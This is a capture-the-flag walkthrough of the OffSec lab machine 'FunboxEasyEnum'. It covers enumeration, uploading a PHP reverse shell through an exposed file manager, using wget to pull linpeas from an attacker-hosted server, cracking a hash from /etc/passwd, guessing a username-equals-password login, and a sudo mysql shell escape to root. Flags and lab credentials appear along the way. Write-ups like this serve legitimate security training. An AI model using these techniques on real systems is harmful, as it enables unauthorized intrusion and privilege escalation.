# FunboxEasyEnum

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.158.132
```

Open ports discovered:

- **22** — SSH (OpenSSH 7.6p1 Ubuntu 4ubuntu0.3, Ubuntu Linux; protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.29, Ubuntu)
  - Additional webpages:
    - `http://192.168.158.132/robots.txt`
    - `http://192.168.158.132/Enum_this_Box`
    - `http://192.168.158.132/mini.php`
    - `http://192.168.158.132/phpmyadmin/`
    - `http://192.168.158.132/icons/`

The root path returned the Apache default page. The `robots.txt` file allowed access to `Enum_this_Box`, which returned a 404.

The `/mini.php` page provided file management functionality within `/var/www/html`: upload, delete, `chmod`, and edit. Uploaded a PHP reverse shell through this interface and accessed it at `http://192.168.158.132/reverse_shell.php`, catching the shell with `penelope`:

```
www-data@lab-pg-ubuntu18-funboxeasyenum-243-108:/$ whoami
www-data
```

Retrieved the local flag:

```
www-data@lab-pg-ubuntu18-funboxeasyenum-243-108:/$ find / -name local.txt 2>/dev/null
/var/www/local.txt

www-data@lab-pg-ubuntu18-funboxeasyenum-243-108:/$ cat /var/www/local.txt
079c816d8bf825701121c223110d0b99
```

## Privilege escalation

Uploaded linpeas.sh via a Python HTTP server on the host:

```
# Host
python3 -m http.server 9001
ip a
inet 192.168.45.212/24

# Target
www-data@lab-pg-ubuntu18-funboxeasyenum-243-108:/$ cd /tmp
www-data@lab-pg-ubuntu18-funboxeasyenum-243-108:/tmp$ which wget
/usr/bin/wget
www-data@lab-pg-ubuntu18-funboxeasyenum-243-108:/tmp$ wget http://192.168.45.212:9001/linpeas.sh
```

Ran linpeas.sh. Noted that `pwnkit`, `copyfail`, and `DirtyFrag` did not work.

The key finding was a password hash for the `oracle` user embedded in `/etc/passwd`:

```
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0
```

Cracked the hash using `hashcat`:

```
hashcat --identify hash.txt
The following hash-mode match the structure of your input hash:
      # | Name                                                       | Category
  ======+============================================================+======================================
    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                  | Operating System

hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:hiphop
```

Logged in as `oracle`:

```
www-data@lab-pg-ubuntu18-funboxeasyenum-243-108:/tmp$ su oracle
Password: hiphop
oracle@lab-pg-ubuntu18-funboxeasyenum-243-108:/tmp$ whoami
oracle
```

Nothing useful was found as `oracle`. Tried logging into other accounts with basic credentials (username = password). `karla`, `harry`, and `sally` failed, but `goat` succeeded:

```
oracle@lab-pg-ubuntu18-funboxeasyenum-243-108:/tmp$ su goat
Password: goat
goat@lab-pg-ubuntu18-funboxeasyenum-243-108:/tmp$ whoami
goat
```

Checked sudo privileges:

```
goat@lab-pg-ubuntu18-funboxeasyenum-243-108:/tmp$ sudo -l
User goat may run the following commands on lab-pg-ubuntu18-funboxeasyenum-243-108:
    (root) NOPASSWD: /usr/bin/mysql
```

Gained a privileged shell using `mysql` via GTFOBins:

```
goat@lab-pg-ubuntu18-funboxeasyenum-243-108:/tmp$ sudo mysql -e '\! /bin/sh'
# whoami
root
```

Retrieved the proof flag:

```
# cd /root
# cat proof.txt
1349b15495303715c2397fc852d25ffa
```

## Alternative Privilege Escalation — phpmyadmin config-db.php

The file `/etc/phpmyadmin/config-db.php` contains MySQL credentials readable by `www-data`:

```
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm!';
```

Based on user privileges, the admin user was deduced to be `karla`. SSHing in as `karla:tgbzhnujm!` revealed full sudo access (`(ALL : ALL) ALL`), allowing a root shell via `sudo /bin/bash`.

Credit: [Antonio — OffSec PG: FunboxEasyEnum Walkthrough](https://medium.com/@inotp/offsec-pg-funboxeasyenum-walkthrough-2d5012f9ecc7)
